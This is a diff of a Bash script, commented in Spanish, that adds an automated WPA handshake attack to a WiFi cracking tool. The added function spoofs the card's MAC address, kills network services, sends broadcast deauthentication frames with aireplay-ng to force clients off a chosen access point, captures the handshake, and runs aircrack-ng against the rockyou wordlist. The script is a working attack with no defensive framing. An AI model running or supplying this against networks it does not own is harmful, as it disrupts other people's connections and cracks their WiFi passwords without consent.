@@ -18,7 +18,9 @@ trap ctrl_c INT
 
 function ctrl_c(){
     echo -e "${redColor}[!]${endColor} ${grayColor}Saliendo...${endColor}"
-    tput cnorm; exit 0
+    tput cnorm; airmon-ng stop ${network_card}mon > /dev/null 2>&1
+    rm Captura* 2> /dev/null
+    exit 0
 }
 
 function helpPanel(){
@@ -35,7 +37,7 @@ function dependecies(){
     reset; dependecies=(aircrack-ng macchanger)
 
     tput civis
-    echo -e "${yellowColor}[*]${endColor}${grayColor} Comprobando dependencias...${endColor}"
+    echo -e "${yellowColor}[i]${endColor}${grayColor} Comprobando dependencias...${endColor}"
     sleep 2
 
     for dependecy in "${dependecies[@]}"; do
@@ -56,7 +58,38 @@ function dependecies(){
 }
 
 function startAttack(){
-    echo
+    if [ "$(echo $attack_mode)" == "Handshake" ]; then
+        echo -e "${yellowColor}[!]${endColor} ${grayColor}Configurando tarjeta de red en modo monitor${endColor}"
+        airmon-ng check kill
+        airmon-ng start $network_card > /dev/null 2>&1
+        ifconfig ${network_card}mon down && macchanger -a ${network_card}mon > /dev/null 2>&1
+        ifconfig ${network_card}mon up
+
+        killall dhclient wpa_supplicant 2> /dev/null
+
+        new_mac=$(macchanger -s ${network_card}mon | grep -i 'current' | xargs | cut -d  ' ' -f '3-10')
+        echo -e "${yellowColor}[i]${endColor} ${grayColor}Nueva direccion MAC asignada${endColor} ${purpleColor}(${endColor} ${blueColor}$new_mac${endColor} ${purpleColor})${endColor}"
+
+        xterm -hold -e "airodump-ng ${network_card}mon" & # Abre un nuevo terminal en segundo plano.
+        airodump_xterm_PID=$! # Obtiene el PID de la terminal en segundo plano.
+
+        echo -ne "${yellowColor}[*]${endColor} ${grayColor}Ingrese el nombre del SSID: ${endColor}" && read ap_ssid
+        echo -ne "${yellowColor}[*]${endColor} ${grayColor}Ingrese el canal del SSID: ${endColor}" && read ap_canal
+        kill -9 $airodump_xterm_PID
+        wait $airodump_xterm_PID 2> /dev/null
+
+        xterm -hold -e "airodump-ng -c $ap_canal -w Captura --essid $ap_ssid ${network_card}mon" &
+        airodump_fliter_xterm_PID=$!
+
+        sleep 5; xterm -hold -e "aireplay-ng -0 20 -e $ap_ssid -c FF:FF:FF:FF:FF:FF ${network_card}mon" &
+        aireplay_xterm_PID=$!
+        sleep 10; kill -9 $aireplay_xterm_PID; wait $aireplay_xterm_PID 2> /dev/null
+
+        sleep 10; kill -9 $airodump_fliter_xterm_PID
+        wait $airodump_fliter_xterm_PID 2> /dev/null
+
+        xterm -hold -e "aircrack-ng -w /usr/share/wordlists/rockyou.txt Captura-01.cap" &
+    fi
 }
 
 if [ "$(id -u)" == "0" ]; then
@@ -74,6 +107,7 @@ if [ "$(id -u)" == "0" ]; then
     else
         dependecies
         startAttack
+        tput cnorm; airmon-ng stop ${network_card}mon > /dev/null 2>&1
     fi
 
 else
